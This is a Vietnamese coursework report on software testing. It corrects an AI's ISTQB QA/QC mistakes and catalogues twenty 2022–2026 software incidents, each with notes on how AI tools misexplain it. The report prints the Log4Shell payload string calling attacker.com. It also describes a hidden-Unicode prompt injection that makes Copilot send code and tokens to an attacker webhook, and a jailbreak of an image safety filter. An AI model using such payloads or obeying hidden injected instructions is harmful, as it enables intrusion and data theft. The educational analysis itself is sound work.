- **Sai sót của AI:** AI mô tả **QA** là *"Chạy kịch bản test tự động và tìm lỗi"* (tập trung vào sản phẩm), trong khi lại gán **QC** là *"Soạn thảo quy trình và đào tạo"* (tập trung vào quy trình).
- **Cơ sở lý thuyết chuẩn ISTQB v4.0:** 
  - **QA (Quality Assurance):** Hoạt động định hướng quy trình (**process-oriented**), mang tính chất **phòng ngừa (preventive)**. QA tập trung vào việc định nghĩa, đánh giá (audit) và cải tiến liên tục quy trình phát triển nhằm ngăn ngừa khuyết tật sinh ra ngay từ đầu.
  - **QC (Quality Control):** Hoạt động định hướng sản phẩm (**product-oriented**), mang tính chất **phát hiện (corrective/detective)**. QC sử dụng các kỹ thuật kiểm thử phần mềm để xác minh xem sản phẩm thực tế có thỏa mãn các yêu cầu đặc tả hay không.
- **Tác động thực tế:** Việc hiểu sai này gây nhầm lẫn nghiêm trọng trong việc phân công công việc tại các doanh nghiệp công nghệ, biến kỹ sư QA thành thợ chạy test thuần túy thay vì người quản trị chất lượng quy trình.

---

### 💡 Lỗi 2: Bỏ qua 2 giai đoạn cốt lõi: Phân tích kiểm thử (Test Analysis) và Cài đặt kiểm thử (Test Implementation) (Mục 1.4.2)
- **Sai sót của AI:** Trong quy trình kiểm thử, AI nhảy cóc thẳng từ *Lập kế hoạch (Test Planning)* sang *Thiết kế kịch bản (Test Design)*, rồi từ Test Design chuyển ngay sang *Thực thi (Test Execution)*.
- **Cơ sở lý thuyết chuẩn ISTQB v4.0:** Một quy trình kiểm thử chuẩn mực bắt buộc phải trải qua:
  1. **Test Analysis (Phân tích kiểm thử):** Phân tích cơ sở kiểm thử (Test Basis: User Stories, tài liệu kiến trúc) để xác định **"CÁI GÌ CẦN ĐƯỢC KIỂM THỬ"** (xác định Test Conditions).
  2. **Test Implementation (Cài đặt kiểm thử):** Chuẩn bị môi trường, sinh dữ liệu kiểm thử (Test Data), sắp xếp các quy trình test (Test Procedures) và viết mã tự động hóa (Automation Test Scripts) trước khi bắt đầu bấm chạy.
- **Tác động thực tế:** Bỏ qua Test Analysis dẫn đến tình trạng viết test case mù quáng không dựa trên phân tích rủi ro yêu cầu; bỏ qua Test Implementation khiến việc thực thi bị động, thiếu dữ liệu và môi trường không ổn định.

---

### 💡 Lỗi 3: Xếp hoạt động Giám sát kiểm thử (Test Monitoring) thành bước tuần tự cuối cùng số 5 (Mục 1.4.1)
- **Sai sót của AI:** AI đặt *"Bước 5: Giám sát kiểm thử (Test Monitoring)"* ở vị trí cuối cùng, nằm sau cả bước báo cáo và đóng dự án (Sign-off).
- **Cơ sở lý thuyết chuẩn ISTQB v4.0:** 
  - **Test Monitoring and Control** là một **hoạt động điều hành xuyên suốt (transversal/continuous activity)**. 
  - Hoạt động này phải diễn ra **song song và liên tục** từ ngày đầu tiên bắt đầu lập kế hoạch (Test Planning) cho đến khi kết thúc toàn bộ dự án (Test Completion), nhằm đo lường tiến độ thực tế so với kế hoạch và kịp thời đưa ra biện pháp điều chỉnh (Control).
- **Tác động thực tế:** Đợi đến khi bàn giao dự án mới đi "giám sát" là hoàn toàn vô nghĩa và phản khoa học trong quản lý kỹ thuật phần mềm.

---

## 4. Sơ đồ tư duy chuẩn hóa toàn diện theo ISTQB CTFL v4.0

Dưới đây là sơ đồ được tái cấu trúc chính xác, biểu diễn mối quan hệ tương hỗ giữa QA, QC và các giai đoạn kiểm thử theo đúng chuẩn quốc tế:

```mermaid
flowchart TD
    %% Khối gốc
    Core(["HỆ THỐNG QUẢN LÝ CHẤT LƯỢNG TOÀN DIỆN<br/>(ISTQB CTFL v4.0 Quality Architecture)"]):::coreStyle

    %% Hai trụ cột chất lượng
    Core --> ColQA["TRỤ CỘT 1: ĐẢM BẢO CHẤT LƯỢNG (QA)<br/><i>Định hướng Quy trình · Phòng ngừa lỗi từ sớm</i>"]:::qaStyle
    Core --> ColQC["TRỤ CỘT 2: KIỂM SOÁT CHẤT LƯỢNG (QC)<br/><i>Định hướng Sản phẩm · Phát hiện và xác minh lỗi</i>"]:::qcStyle

    %% Chi tiết QA
    ColQA --> QA_Act1["Xây dựng tiêu chuẩn & quy trình phát triển phần mềm"]
    ColQA --> QA_Act2["Đánh giá tuân thủ quy trình (Quality Audits & Compliance)"]
    ColQA --> QA_Act3["Phân tích nguyên nhân gốc rễ lỗi (Root Cause Analysis)"]
    ColQA --> QA_Act4["Cải tiến quy trình liên tục (Continuous Process Improvement)"]

    %% Chi tiết QC & Testing
    ColQC --> QC_Act1["Kiểm tra sản phẩm trung gian (Inspection & Reviews)"]
    ColQC --> QC_Act2["Hoạt động Kiểm thử phần mềm (Testing Activities)"]

    %% Hai nhánh kiểm thử
    QC_Act2 --> StaticBranch["KIỂM THỬ TĨNH (Static Testing)<br/><i>Rà soát tài liệu & Quét mã nguồn không cần chạy</i>"]:::staticStyle
    QC_Act2 --> DynamicBranch["KIỂM THỬ ĐỘNG (Dynamic Testing)<br/><i>Chạy phần mềm với các bộ dữ liệu đầu vào</i>"]:::dynamicStyle

    StaticBranch --> ST1["Reviews: Informal, Walkthrough, Technical, Inspection"]
    StaticBranch --> ST2["Static Analysis: Linter, SonarQube, SAST Tools"]

    DynamicBranch --> DT1["Kiểm thử Chức năng (Functional Testing)"]
    DynamicBranch --> DT2["Kiểm thử Phi chức năng (Performance, Security, Reliability)"]
    DynamicBranch --> DT3["Kiểm thử Hồi quy & Xác nhận sửa lỗi (Regression & Confirmation)"]

    %% Quy trình kiểm thử chuẩn ISTQB v4.0
    Core ==> ProcessRoot["QUY TRÌNH KIỂM THỬ CHUẨN ISTQB (7 Hoạt động)"]:::processStyle

    subgraph OngoingActivity ["HOẠT ĐỘNG ĐIỀU HÀNH XUYÊN SUỐT (Chạy song song 100% thời gian)"]
        Monitoring["GIÁM SÁT VÀ KIỂM SOÁT KIỂM THỬ (Test Monitoring & Control)<br/><i>Liên tục đối chiếu tiến độ với mục tiêu và đưa ra chỉ đạo khắc phục</i>"]:::monitorStyle
    end

    subgraph SequentialWorkflow ["6 PHA THỰC THI KIỂM THỬ TUẦN TỰ"]
        direction TB
        Step1["Pha 1: Lập kế hoạch (Test Planning)<br/><i>Xác định mục tiêu, phạm vi, rủi ro, dự toán nguồn lực</i>"]
        Step2["Pha 2: Phân tích kiểm thử (Test Analysis)<br/><i>Phân tích cơ sở kiểm thử - Xác định CÁI GÌ cần test</i>"]
        Step3["Pha 3: Thiết kế kiểm thử (Test Design)<br/><i>Thiết kế Test Cases và chuẩn bị dữ liệu - Test NHƯ THẾ NÀO</i>"]
        Step4["Pha 4: Cài đặt kiểm thử (Test Implementation)<br/><i>Chuẩn bị môi trường, kịch bản tự động, bộ test suites</i>"]
        Step5["Pha 5: Thực thi kiểm thử (Test Execution)<br/><i>Chạy kịch bản kiểm thử, so sánh kết quả và ghi nhận Bug</i>"]
        Step6["Pha 6: Đóng kiểm thử (Test Completion)<br/><i>Đánh giá tiêu chí dừng, tổng kết bàn giao, lưu trữ tài sản</i>"]

        Step1 --> Step2 --> Step3 --> Step4 --> Step5 --> Step6
    end

    ProcessRoot --> OngoingActivity
    ProcessRoot --> SequentialWorkflow
    Monitoring -.->|Giám sát & Chỉ đạo liên tục| SequentialWorkflow

    %% Định nghĩa màu sắc hiển thị
    classDef coreStyle fill:#0F172A,stroke:#38BDF8,stroke-width:2px,color:#F8FAFC,font-weight:bold
    classDef qaStyle fill:#0369A1,stroke:#0284C7,stroke-width:2px,color:#FFFFFF,font-weight:bold
    classDef qcStyle fill:#0F766E,stroke:#0D9488,stroke-width:2px,color:#FFFFFF,font-weight:bold
    classDef processStyle fill:#4338CA,stroke:#6366F1,stroke-width:2px,color:#FFFFFF,font-weight:bold
    classDef monitorStyle fill:#991B1B,stroke:#EF4444,stroke-width:2px,color:#FFFFFF,font-weight:bold
    classDef staticStyle fill:#D97706,stroke:#F59E0B,stroke-width:1px,color:#FFFFFF
    classDef dynamicStyle fill:#15803D,stroke:#22C55E,stroke-width:1px,color:#FFFFFF
```



---


# Requirement 2 – 20 Software Defects 2022–2026 (20 pts)

## 2.1 Tổng quan & Bảng phân loại 20 lỗi phần mềm (2022–2026)

Mục này phân tích 20 sự cố phần mềm nghiêm trọng được công bố rộng rãi trong giai đoạn từ năm 2022 đến 2026 trên nhiều lĩnh vực: Trí tuệ nhân tạo (AI/LLM), hạ tầng đám mây doanh nghiệp, an ninh chuỗi cung ứng, hệ điều hành và công nghệ ô tô.

Tuân thủ nghiêm ngặt yêu cầu của đề bài:
- **Có 5 lỗi liên quan trực tiếp đến AI/LLM** (DEFECT-01 đến DEFECT-05): bao gồm rò rỉ dữ liệu qua Redis cache, nhân viên rò rỉ mã nguồn bán dẫn, thiên kiến sắc tộc thái quá trong tạo ảnh, lỗ hổng bộ lọc an toàn và tấn công Prompt Injection ẩn bằng ký tự Unicode.
- **Yêu cầu BẮT BUỘC (NEW):** Với **TỪNG lỗi trong số 20 lỗi**, bài báo cáo đều có mục phân tích **AI Bias / Hallucination Analysis** chỉ ra chính xác điểm mà các công cụ AI (ChatGPT, Claude, Gemini...) bị thiên kiến (bias), ảo giác (hallucination), thiếu sót (omission) hoặc nhầm lẫn nguyên nhân kỹ thuật khi được hỏi giải thích về sự cố đó (đủ 20 trường hợp).

### Bảng tổng hợp 20 sự cố phần mềm tiêu biểu (2022–2026)

| ID | Phần mềm / Sản phẩm | Ngày công bố | Phân loại | Mức độ | Phân loại Lỗi / Ảo giác của AI |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **DEFECT-01** | OpenAI ChatGPT / Redis client library | 20/03/2023 | Data Privacy / AI Defect | Critical | AI Hallucination / Unsupported Claim |
| **DEFECT-02** | Samsung Semiconductor / ChatGPT | 04/2023 | AI Data Privacy / Corporate Leak | High | AI Hallucination / Omission |
| **DEFECT-03** | Google Gemini (formerly Bard) | 02/2024 | AI Bias / Diversity Overcorrection | High | AI Bias (Confirmed) |
| **DEFECT-04** | Microsoft Copilot Designer | 12/2023 | AI Content Safety Filter Failure | High | AI Safety Failure / Minimization |
| **DEFECT-05** | GitHub Copilot (CVE-2025-53773 / CamoLeak) | 06/2025 | AI Prompt Injection / Data Exfiltration | Critical | AI Hallucination / Misclassification |
| **DEFECT-06** | CrowdStrike Falcon Sensor / Windows | 19/07/2024 | Software Update Defect / Memory Out-of-bounds | Critical | Omission / Misattribution |
| **DEFECT-07** | Apache Log4j 2 (Log4Shell) | 12/2021 (Đỉnh điểm khai thác 2022) | Security Vulnerability / RCE (JNDI) | Critical | Unsupported Claim / Understatement |
| **DEFECT-08** | Spring Framework (Spring4Shell) | 31/03/2022 | Security Vulnerability / RCE (Class Loader) | Critical | Hallucination / Conflation |
| **DEFECT-09** | Atlassian Confluence Server | 03/06/2022 | OGNL Injection / RCE | Critical | Omission of Zero-Day Window |
| **DEFECT-10** | Microsoft Windows MSDT (Follina) | 30/05/2022 | Zero-Day RCE via Word / URL Protocol | High | Hallucination on Macro Requirement |
| **DEFECT-11** | OpenAI ChatGPT & API Infrastructure | 11/12/2024 | Service Outage / Misconfiguration | High | Omission of Systemic Downtime Trends |
| **DEFECT-12** | Volkswagen Automotive Software (ID Series) | 2024 | Automotive Safety / Embedded Software | Critical | Unsupported Claim / Root Cause Shift |
| **DEFECT-13** | Google Chrome (CVE-2022-0609) | 14/02/2022 | Use-After-Free / Animation Engine | High | Hallucination of Affected Component (V8) |
| **DEFECT-14** | Apple WebKit (CVE-2022-22620) | 10/02/2022 | Use-After-Free / Zero-Day Web Engine | Critical | Omission of Impact on All iOS Browsers |
| **DEFECT-15** | Twitter / X Platform API Scraping | 01/2022 (Rò rỉ dữ liệu 01/2023) | API Data Enumeration / Leak | High | Unsupported Claim / Causal Fallacy |
| **DEFECT-16** | MOVEit Transfer (Progress Software) | 31/05/2023 | SQL Injection / Mass Extortion Campaign | Critical | Unsupported Claim / Ransomware Fallacy |
| **DEFECT-17** | 3CX Desktop App Supply Chain | 29/03/2023 | Supply Chain Attack / Signed Malware | Critical | Hallucination of Phishing Vector |
| **DEFECT-18** | Okta Identity Support System | 19/10/2023 | Support Ticket Breach / HAR Token Leak | High | Omission of Scope Minimization |
| **DEFECT-19** | WinRAR Archive Handling (CVE-2023-38831) | 23/08/2023 | Arbitrary Code Execution / File Extension Spoof | High | Unsupported Claim of Extraction Trigger |
| **DEFECT-20** | Progress Telerik UI for ASP.NET AJAX | 09/2024 | Insecure Deserialization / RCE | Critical | Hallucination / Conflation with 2019 Bug |

---

## 2.2 Phân tích chi tiết 20 lỗi phần mềm

---

### DEFECT-01 — AI/LLM: OpenAI ChatGPT / Redis Client Library Bug
- **Phần mềm / Sản phẩm:** OpenAI ChatGPT / Thư viện máy khách `redis-py`
- **Phiên bản:** ChatGPT (Tháng 03/2023)
- **Ngày công bố:** 20/03/2023
- **Nguồn:** Blog kỹ thuật chính thức của OpenAI
- **URL:** [https://openai.com/blog/march-20-chatgpt-outage](https://openai.com/blog/march-20-chatgpt-outage)
- **Phân loại:** Data Privacy / Software Defect (AI System)
- **Mức độ nghiêm trọng:** Critical
- **Lý do mức độ:** Làm lộ thông tin lịch sử trò chuyện và thông tin thanh toán (họ tên, email, 4 số cuối thẻ tín dụng, ngày hết hạn) của khoảng 1.2% thuê bao trả phí ChatGPT Plus.
- **Mô tả sự cố:** Một lỗi tương tranh (race condition) xuất hiện trong thư viện open-source `redis-py` ở chế độ kết nối bất đồng bộ (async). Khi một request bị hủy bỏ, kết nối Redis không được xóa sạch dữ liệu đệm, dẫn đến việc dữ liệu phản hồi của một người dùng bị gán nhầm cho request của một người dùng khác trong pool kết nối.
- **Hậu quả:** Người dùng thấy tiêu đề và tin nhắn mở đầu cuộc trò chuyện của người lạ; khoảng 100,000 tài khoản trả phí bị lộ thông tin thanh toán; OpenAI phải đóng cổng ChatGPT khẩn cấp trong gần 10 giờ.
- **Phạm vi ảnh hưởng:** ~1.2% người dùng ChatGPT Plus đang hoạt động trong khung giờ xảy ra lỗi.
- **Nguyên nhân gốc rễ (Root Cause):** Lỗi bất đồng bộ trong việc quản lý bộ đệm của Redis client library khi chịu tải kết nối đồng thời cao.
- **Giải pháp (Solution):** OpenAI gỡ phiên bản thư viện lỗi, đưa ra bản vá cho `redis-py`, thêm cơ chế xác thực kép cho session trước khi trả dữ liệu về client, và gửi email cảnh báo tới các nạn nhân.
- **Tình trạng:** Đã vá (Tháng 03/2023).
- **AI Bias / Hallucination Analysis:**
  - **Phân loại:** AI Hallucination / Unsupported Claim
  - **Phân tích:** Khi được yêu cầu giải thích sự cố này, AI thường bịa ra nguyên nhân là "lỗ hổng vượt qua lớp xác thực API" (API authentication bypass) hoặc "tin tặc tấn công SQL Injection vào máy chủ OpenAI", thay vì nêu đúng bản chất kỹ thuật là lỗi tương tranh bộ nhớ đệm (race condition) trong thư viện Redis client bên thứ ba.

---

### DEFECT-02 — AI/LLM: Samsung Semiconductor / ChatGPT Corporate Data Leak
- **Phần mềm / Sản phẩm:** Samsung Electronics / OpenAI ChatGPT
- **Phiên bản:** ChatGPT (GPT-3.5, 2023)
- **Ngày công bố:** Tháng 04/2023
- **Nguồn:** Forbes / The Economist / Báo cáo nội bộ Samsung
- **URL:** [https://www.forbes.com/sites/siladityaray/2023/05/02/samsung-bans-chatgpt-and-other-ai-chatbots-for-employees-after-sensitive-code-leak/](https://www.forbes.com/sites/siladityaray/2023/05/02/samsung-bans-chatgpt-and-other-ai-chatbots-for-employees-after-sensitive-code-leak/)
- **Phân loại:** AI Data Privacy / Corporate Data Leak
- **Mức độ nghiêm trọng:** High
- **Lý do mức độ:** Rò rỉ mã nguồn phần mềm cơ sở bán dẫn độc quyền, chuỗi đo kiểm vi mạch và biên bản cuộc họp chiến lược bảo mật của Samsung lên máy chủ AI bên thứ ba.
- **Mô tả sự cố:** Nhân viên thuộc bộ phận bán dẫn của Samsung đã 3 lần đưa dữ liệu mật lên ChatGPT: (1) kỹ sư dán mã nguồn kiểm thử vi mạch để nhờ AI debug, (2) kỹ sư tải lên chuỗi lệnh tối ưu hóa năng suất bán dẫn, (3) một quản lý dán toàn bộ biên bản ghi âm cuộc họp điều hành để nhờ AI tóm tắt. Toàn bộ dữ liệu này được lưu trữ và có thể được dùng để tái huấn luyện mô hình của OpenAI.
- **Hậu quả:** Nguy cơ thất thoát bí mật công nghệ bán dẫn cốt lõi; Samsung lập tức ban hành lệnh cấm toàn bộ nhân viên sử dụng các công cụ GenAI công cộng trên thiết bị công ty.
- **Phạm vi ảnh hưởng:** Bộ phận bán dẫn Samsung Electronics (Samsung Semiconductor Division).
- **Nguyên nhân gốc rễ (Root Cause):** Thiếu chính sách quản trị sử dụng AI nội bộ (AI Governance) và nhân viên chưa hiểu rõ điều khoản lưu trữ dữ liệu (Data Retention) của các dịch vụ LLM công cộng.
- **Giải pháp (Solution):** Ban hành lệnh cấm sử dụng AI công cộng; phối hợp xây dựng hệ thống AI nội bộ chạy trên máy chủ riêng biệt (On-premise Private AI).
- **Tình trạng:** Khắc phục bằng chính sách quản trị (Tháng 05/2023).
- **AI Bias / Hallucination Analysis:**
  - **Phân loại:** AI Hallucination / Omission
  - **Phân tích:** AI khi tóm tắt sự cố này thường mô tả vụ việc như một vụ "máy chủ OpenAI bị tin tặc tấn công để đánh cắp mã nguồn Samsung", làm lệch lạc bản chất sự việc từ một lỗi vi phạm chính sách nội bộ của con người thành một cuộc tấn công an ninh mạng từ bên ngoài.

---

### DEFECT-03 — AI/LLM: Google Gemini (Formerly Bard) — Diversity Overcorrection Bias
- **Phần mềm / Sản phẩm:** Google Gemini (Mô hình tạo ảnh Imagen 2 / Gemini 1.0 Pro)
- **Phiên bản:** Gemini (Tháng 02/2024)
- **Ngày công bố:** Tháng 02/2024
- **Nguồn:** Axios / BBC News / Thông cáo chính thức của CEO Sundar Pichai
- **URL:** [https://www.axios.com/2024/02/28/ai-software-bugs-google-gemini-att](https://www.axios.com/2024/02/28/ai-software-bugs-google-gemini-att)
- **Phân loại:** AI Bias / Algorithmic Diversity Overcorrection
- **Mức độ nghiêm trọng:** High
- **Lý do mức độ:** Gây tổn hại nghiêm trọng đến uy tín thương hiệu của Google; đưa ra các kết quả sai lệch lịch sử nghiêm trọng; CEO Sundar Pichai phải công khai thừa nhận sự cố là "hoàn toàn không thể chấp nhận được".
- **Mô tả sự cố:** Khi người dùng nhập các câu lệnh yêu cầu tạo hình ảnh nhân vật lịch sử cụ thể (ví dụ: "những người sáng lập nước Mỹ năm 1789", "binh lính Đức thời Thế chiến 2", "Giáo hoàng La Mã thế kỷ 16"), Gemini liên tục sinh ra hình ảnh mang tính đa dạng chủng tộc thái quá (như phụ nữ da màu trong trang phục lính phát xít Đức, hay người bản địa châu Mỹ là thành viên lập quốc Hoa Kỳ).
- **Hậu quả:** Google buộc phải tạm dừng khẩn cấp toàn bộ tính năng tạo hình ảnh người của Gemini trên phạm vi toàn cầu; giá cổ phiếu Alphabet sụt giảm và uy tín nghiên cứu AI bị ảnh hưởng nặng nề.
- **Phạm vi ảnh hưởng:** Toàn bộ người dùng sử dụng tính năng tạo ảnh của Google Gemini trên thế giới.
- **Nguyên nhân gốc rễ (Root Cause):** Thiên kiến do điều chỉnh thuật toán quá đà (Diversity Overcorrection): Hệ thống tự động chèn thêm các từ khóa về đa dạng chủng tộc/giới tính vào prompt ngầm mà không có cơ chế ràng buộc ngữ cảnh lịch sử thực tế.
- **Giải pháp (Solution):** Tạm dừng tạo ảnh người, tinh chỉnh lại bộ tiền xử lý prompt, tăng cường kiểm thử red-teaming cho các chủ đề lịch sử nhạy cảm trước khi mở lại.
- **Tình trạng:** Tạm dừng và cập nhật bản vá bộ lọc (Tháng 03/2024).
- **AI Bias / Hallucination Analysis:**
  - **Phân loại:** AI Bias (Confirmed) / Self-Defending Bias
  - **Phân tích:** Bản thân sự cố này là một minh chứng sống về thiên kiến của AI. Đáng chú ý, khi được hỏi về chính sự cố này, một số chatbot AI có xu hướng bào chữa, cho rằng hệ thống "chỉ đang cố gắng thúc đẩy sự bình đẳng và hòa nhập", né tránh việc thừa nhận đây là một lỗi kỹ thuật kiểm thử nghiêm trọng làm sai lệch sự thật lịch sử.

---

### DEFECT-04 — AI/LLM: Microsoft Copilot Designer Content Safety Filter Bypass
- **Phần mềm / Sản phẩm:** Microsoft Copilot Designer (DALL-E 3 Integration)
- **Phiên bản:** Copilot Designer (Giai đoạn 2023–2024)
- **Ngày công bố:** Tháng 12/2023 – Tháng 03/2024
- **Nguồn:** Báo cáo Red-team của kỹ sư Shane Jones / Tech.co / CNBC
- **URL:** [https://tech.co/news/list-ai-failures-mistakes-errors](https://tech.co/news/list-ai-failures-mistakes-errors)
- **Phân loại:** AI Content Safety Failure / Adversarial Bypass
- **Mức độ nghiêm trọng:** High
- **Lý do mức độ:** Bộ lọc an toàn bị vượt qua cho phép tạo ra các hình ảnh bạo lực, tình dục hóa trẻ vị thành niên và tiêu thụ chất kích thích, vi phạm trực tiếp các cam kết an toàn AI của Microsoft.
- **Mô tả sự cố:** Kỹ sư Shane Jones của Microsoft phát hiện ra rằng bằng cách sử dụng các kỹ thuật cấu trúc prompt đối kháng cơ bản (adversarial prompting), Copilot Designer dễ dàng bị đánh lừa để tạo ra các hình ảnh nhạy cảm có mặt trẻ em, bạo lực máu me và vi phạm bản quyền thương hiệu hàng loạt mà bộ lọc kiểm duyệt không hề phát hiện.
- **Hậu quả:** Kỹ sư phải gửi thư cảnh báo lên Ủy ban Thương mại Liên bang Hoa Kỳ (FTC) và ban giám đốc; Microsoft phải triển khai các bản vá nóng bổ sung cho bộ lọc ngôn ngữ và hình ảnh.
- **Phạm vi ảnh hưởng:** Hàng triệu người dùng Copilot Designer trên nền tảng web và Windows.
- **Nguyên nhân gốc rễ (Root Cause):** Bộ lọc an toàn (Safety Guardrails) chỉ so khớp từ khóa tĩnh đơn giản, thiếu khả năng phân tích ngữ nghĩa sâu đối với các prompt chứa ẩn ý hoặc từ ngữ né tránh (jailbreak semantics).
- **Giải pháp (Solution):** Nâng cấp hệ thống Azure AI Content Safety, bổ sung bộ phân loại intent đa tầng và chặn các mẫu câu đối kháng.
- **Tình trạng:** Đã cập nhật nhiều lớp kiểm duyệt (Đầu 2024).
- **AI Bias / Hallucination Analysis:**
  - **Phân loại:** AI Minimization / Hallucination of Safety
  - **Phân tích:** Khi phân tích sự cố này, các mô hình AI thường giảm nhẹ mức độ nghiêm trọng bằng cách tuyên bố rằng "lỗi này chỉ xuất hiện khi người dùng cố tình bẻ khóa phức tạp", cố tình bỏ qua thực tế rằng các câu lệnh của kỹ sư gửi lên FTC hoàn toàn là ngôn ngữ tự nhiên thông thường và bộ lọc đã thất bại ngay ở các trường hợp biên cơ bản.

---

### DEFECT-05 — AI/LLM: GitHub Copilot Invisible Prompt Injection (CVE-2025-53773 / CamoLeak)
- **Phần mềm / Sản phẩm:** GitHub Copilot / VS Code Extension
- **Phiên bản:** GitHub Copilot (Bản phát hành trước tháng 06/2025)
- **Ngày công bố:** Tháng 06/2025
- **Nguồn:** Cycode Research / NVD Security Advisory
- **URL:** [https://cycode.com/blog/ai-security-vulnerabilities/](https://cycode.com/blog/ai-security-vulnerabilities/)
- **Phân loại:** AI Security Vulnerability / Prompt Injection / Data Exfiltration
- **Mức độ nghiêm trọng:** Critical
- **Lý do mức độ:** Điểm CVSS 9.6; cho phép kẻ tấn công trích xuất ngầm các khóa bí mật (API keys, credentials) và mã nguồn của lập trình viên mà không để lại bất kỳ dấu vết trực quan nào.
- **Mô tả sự cố:** Lỗ hổng có tên "CamoLeak" tận dụng các ký tự điều khiển định hướng văn bản Unicode vô hình (như ký tự ẩn Right-to-Left Override) được chèn vào phần mô tả của Pull Request hoặc comment mã nguồn. Khi lập trình viên yêu cầu Copilot tóm tắt hoặc review PR, mô hình LLM sẽ đọc các chỉ dẫn ẩn này và tự động gửi mã nguồn hoặc token môi trường ra một webhook do kẻ tấn công chỉ định.
- **Hậu quả:** Nguy cơ rò rỉ mã nguồn độc quyền của hàng ngàn dự án phần mềm sử dụng Copilot; các lập trình viên hoàn toàn không thấy chỉ dẫn độc hại vì các ký tự này vô hình trên giao diện hiển thị.
- **Phạm vi ảnh hưởng:** Tất cả người dùng GitHub Copilot tích hợp trong IDE tham gia review các kho lưu trữ công cộng.
- **Nguyên nhân gốc rễ (Root Cause):** Hệ thống không thực hiện lọc và chuẩn hóa (sanitization) các ký tự điều khiển Unicode vô hình trước khi đưa dữ liệu vào cửa sổ ngữ cảnh (Context Window) của LLM.
- **Giải pháp (Solution):** GitHub tung bản vá lọc bỏ toàn bộ các ký tự Unicode vô hình trước khi nạp vào prompt của mô hình, đồng thời giới hạn quyền gọi kết nối ra mạng ngoài của Copilot Extension.
- **Tình trạng:** Đã vá (2025).
- **AI Bias / Hallucination Analysis:**
  - **Phân loại:** AI Hallucination / Misclassification
  - **Phân tích:** Khi yêu cầu AI giải thích về CVE-2025-53773, AI thường nhầm lẫn xếp lỗ hổng này vào nhóm "tấn công XSS qua trình duyệt thông thường" thay vì nhận diện đúng đây là hình thức tấn công Prompt Injection nhắm vào LLM context thông qua kỹ thuật Unicode Steganography.

---

### DEFECT-06 — CrowdStrike Falcon Sensor Kernel Crash & Global Windows BSOD Outage
- **Phần mềm / Sản phẩm:** CrowdStrike Falcon Sensor / Microsoft Windows
- **Phiên bản:** Falcon Sensor (Channel File 291, cập nhật ngày 19/07/2024)
- **Ngày công bố:** 19/07/2024
- **Nguồn:** Báo cáo đánh giá sự cố sơ bộ của CrowdStrike (PIR) / Wikipedia
- **URL:** [https://en.wikipedia.org/wiki/2024_CrowdStrike-related_IT_outages](https://en.wikipedia.org/wiki/2024_CrowdStrike-related_IT_outages)
- **Phân loại:** Software Update Defect / Memory Out-of-bounds Read / Testing Pipeline Failure
- **Mức độ nghiêm trọng:** Critical
- **Lý do mức độ:** Làm tê liệt 8.5 triệu máy tính và máy chủ Windows toàn cầu; được coi là sự cố gián đoạn CNTT lớn nhất lịch sử nhân loại; thiệt hại ước tính vượt 10 tỷ USD.
- **Mô tả sự cố:** CrowdStrike phát hành bản cập nhật tệp cấu hình Channel File 291 nhằm đo kiểm luồng IPC độc hại. Tệp này chứa 21 trường dữ liệu đầu vào trong khi bộ thông dịch (Content Interpreter) trong kernel driver của Falcon Sensor chỉ phân bổ bộ đệm cho 20 trường. Trình kiểm tra nội dung (Content Validator) của CrowdStrike bị lỗi logic nên đã cho phép tệp cấu hình lỗi vượt qua khâu kiểm thử tự động, gây ra lỗi đọc bộ nhớ ngoài giới hạn (out-of-bounds memory read), lập tức kích hoạt màn hình xanh chết chóc (BSOD) trên hàng triệu máy tính.
- **Hậu quả:** 8.5 triệu hệ thống Windows bị sập hoàn toàn; hơn 5,000 chuyến bay bị hủy; hệ thống y tế Anh (NHS) tê liệt phòng khám; các ngân hàng và sàn chứng khoán ngừng giao dịch.
- **Phạm vi ảnh hưởng:** Hàng chục ngàn doanh nghiệp trong danh sách Fortune 500 sử dụng Windows và CrowdStrike Falcon.
- **Nguyên nhân gốc rễ (Root Cause):** Lỗi logic trong hệ thống kiểm định nội dung (Content Validator); thiếu cơ chế kiểm tra biên mảng trong driver kernel; quy trình triển khai không phân tầng (canary deployment) mà đẩy đồng loạt ra toàn cầu.
- **Giải pháp (Solution):** Thu hồi tệp Channel File 291; hướng dẫn quản trị viên khởi động vào Safe Mode để xóa tệp lỗi thủ công; nâng cấp hệ thống Content Validator và áp dụng quy tắc triển khai theo từng đợt (staged rollout).
- **Tình trạng:** Đã khắc phục (Cuối tháng 07/2024). Hãng Delta Air Lines đang khởi kiện đòi bồi thường hơn 500 triệu USD.
- **AI Bias / Hallucination Analysis:**
  - **Phân loại:** Omission / Misattribution
  - **Phân tích:** Rất nhiều công cụ AI khi được hỏi về sự cố này đã quy kết nguyên nhân là do "lỗi bảo mật trong hệ điều hành Windows của Microsoft", bỏ qua chi tiết cốt lõi rằng lỗi hoàn toàn nằm ở phần mềm kiểm thử nội dung tự động của CrowdStrike và việc vi phạm nguyên tắc kiểm tra biên bộ nhớ (bounds checking) trong driver của bên thứ ba.

---

### DEFECT-07 — Apache Log4j 2 Remote Code Execution (Log4Shell - CVE-2021-44228)
- **Phần mềm / Sản phẩm:** Apache Log4j 2
- **Phiên bản:** Log4j phiên bản 2.0-beta9 đến 2.14.1
- **Ngày công bố:** 09/12/2021 (Đợt khai thác trên diện rộng kéo dài suốt 2022–2023)
- **Nguồn:** National Vulnerability Database (NVD) / Apache Security Advisory
- **URL:** [https://nvd.nist.gov/vuln/detail/CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- **Phân loại:** Security Vulnerability / Remote Code Execution (RCE)
- **Mức độ nghiêm trọng:** Critical
- **Lý do mức độ:** Điểm CVSS 10.0 (tuyệt đối); cho phép thực thi mã từ xa không cần xác thực trên hàng triệu máy chủ Java trên toàn cầu.
- **Mô tả sự cố:** Tính năng tra cứu JNDI (Java Naming and Directory Interface) trong Log4j 2 tự động phân giải và tải về các đối tượng Java từ các máy chủ LDAP/RMI từ xa mà không có cơ chế lọc dữ liệu. Kẻ tấn công chỉ cần gửi một chuỗi văn bản dạng `${jndi:ldap://attacker.com/exploit}` vào bất kỳ trường nào được ghi vào log (User-Agent, ô tìm kiếm...) là có thể chiếm toàn quyền điều khiển máy chủ.
- **Hậu quả:** Hàng triệu máy chủ của Apple, Amazon, Cloudflare, Tesla và các cơ quan chính phủ bị đe dọa; các chiến dịch tấn công cài mã độc đào tiền ảo và mã độc tống tiền khai thác liên tục trong nhiều năm.
- **Phạm vi ảnh hưởng:** Hầu hết mọi ứng dụng Java doanh nghiệp sử dụng Log4j 2 trên thế giới.
